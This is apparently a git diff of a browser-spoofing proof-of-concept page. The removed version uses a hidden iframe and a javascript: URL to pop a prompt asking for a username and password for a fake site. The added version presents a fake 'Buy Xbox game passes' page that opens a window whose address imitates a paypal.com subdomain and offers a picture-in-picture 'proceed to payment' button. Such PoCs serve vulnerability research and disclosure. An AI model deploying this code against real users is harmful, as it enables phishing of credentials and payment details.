@@ -1,14 +1,10 @@
-<html>
-  <body>
-    <script>
-    function pwn() {
-        win = window.open('https://expired.badssl.com', '_self')
-        setTimeout(`document.getElementById("nop").src = 'javascript:prompt("In order to access fake_website.com,Please enter your username and password", "Username / Password");';`, 3333);
-    }
-    </script>
+<h1>Buy Xbox game passes</h1>
+<button id="pipButton">Make payment.</button>
 
-    <iframe style="display:none" id="nop" src=""></iframe>
-
-    <a href="#" onclick="pwn();"><h1>ClickME :)</h1></a>
-  </body>
-</html>
+<script>
+pipButton.addEventListener("click", async () => {
+  const player = document.querySelector("#player");
+  const w = window.open("about:blank#very-super-duper-long-subdomain.paypal.com") 
+  w.document.write("<button onclick='documentPictureInPicture.requestWindow()'>Click to proceed to payment</button>")
+});
+</script>
